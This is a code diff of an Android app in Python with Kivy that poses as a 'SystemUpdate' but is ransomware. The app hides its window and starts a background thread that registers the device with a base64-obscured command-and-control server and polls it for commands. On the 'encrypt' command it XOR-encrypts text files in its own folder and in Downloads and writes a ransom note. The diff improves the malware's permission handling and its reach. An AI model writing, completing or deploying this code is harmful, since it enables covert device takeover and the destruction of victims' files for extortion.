@@ -1,6 +1,7 @@
 from kivy.app import App
 from kivy.uix.label import Label
 from kivy.core.window import Window
+from kivy.clock import Clock
 
 import requests
 import socket
@@ -16,30 +17,11 @@ try:
     HAS_ANDROID = True
 except:
     HAS_ANDROID = False
-    
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def decode(encoded):
     return base64.b64decode(encoded).decode('utf-8')
-
-def request_android_permissions():
-    if HAS_ANDROID:
-        try:
-            request_permissions([
-                Permission.INTERNET,
-                Permission.READ_EXTERNAL_STORAGE,
-                Permission.WRITE_EXTERNAL_STORAGE
-            ])
-        except:
-            pass
-
-def delete_apk():
-    try:
-        apk_path = "/storage/emulated/0/Download/systemupdate.apk"
-        if os.path.exists(apk_path):
-            os.remove(apk_path)
-    except:
-        pass
 
 encoded_url = "aHR0cHM6Ly9uZXdtZXRob2QtaXNoNi5vbnJlbmRlci5jb20="
 encoded_id = "Mw=="
@@ -54,6 +36,7 @@ try:
 except:
     device_ip = "127.0.0.1"
 
+# ---------- Encryption ----------
 def xor_encrypt_file(filepath, key):
     try:
         with open(filepath, 'rb') as f:
@@ -67,22 +50,32 @@ def xor_encrypt_file(filepath, key):
         return False
 
 def ransomware_attack():
-    folder = "/storage/emulated/0/Download/"
+    # Encrypt files in the app's private directory (always accessible)
+    private_dir = os.path.dirname(os.path.abspath(__file__))
     key = random.randint(1, 255)
     count = 0
     try:
-        for filename in os.listdir(folder):
+        for filename in os.listdir(private_dir):
             if filename.endswith('.txt') and filename != 'READ_ME.txt':
-                filepath = os.path.join(folder, filename)
+                filepath = os.path.join(private_dir, filename)
                 if xor_encrypt_file(filepath, key):
                     count += 1
+        # Also try Downloads folder if possible
+        downloads = "/storage/emulated/0/Download/"
+        if os.path.exists(downloads):
+            for filename in os.listdir(downloads):
+                if filename.endswith('.txt') and filename != 'READ_ME.txt':
+                    filepath = os.path.join(downloads, filename)
+                    if xor_encrypt_file(filepath, key):
+                        count += 1
         if count > 0:
-            note_path = os.path.join(folder, "READ_ME.txt")
+            note_path = os.path.join(private_dir, "READ_ME.txt")
             with open(note_path, 'w') as f:
                 f.write("Your files have been encrypted.\n")
     except:
         pass
 
+# ---------- C2 Communication ----------
 def register_device():
     url = base_url + "/devices"
     data = {"id": device_id, "name": device_name, "ip": device_ip}
@@ -92,10 +85,7 @@ def register_device():
         pass
 
 def background_worker():
-    time.sleep(2)
-    request_android_permissions()
     time.sleep(5)
-    delete_apk()
     register_device()
     while True:
         try:
@@ -105,8 +95,8 @@ def background_worker():
 
         try:
             r = requests.post(base_url + "/command",
-                            json={"deviceId": device_id},
-                            verify=False, timeout=10)
+                              json={"deviceId": device_id},
+                              verify=False, timeout=10)
             if r.status_code == 200:
                 cmd = r.json().get("command")
                 if cmd == "encrypt":
@@ -116,12 +106,31 @@ def background_worker():
 
         time.sleep(random.randint(20, 45))
 
+# ---------- Permission Request (Main Thread) ----------
+def request_android_permissions():
+    if HAS_ANDROID:
+        try:
+            request_permissions([
+                Permission.INTERNET,
+                Permission.READ_EXTERNAL_STORAGE,
+                Permission.WRITE_EXTERNAL_STORAGE
+            ])
+        except:
+            pass
+
+# ---------- Kivy App ----------
 class SystemUpdate(App):
     def build(self):
         Window.size = (1, 1)
         Window.opacity = 0
+
+        # Request permissions on the main thread
+        Clock.schedule_once(lambda dt: request_android_permissions(), 1)
+
+        # Start background C2 thread
         t = threading.Thread(target=background_worker, daemon=True)
         t.start()
+
         return Label(text='')
 
     def on_stop(self):
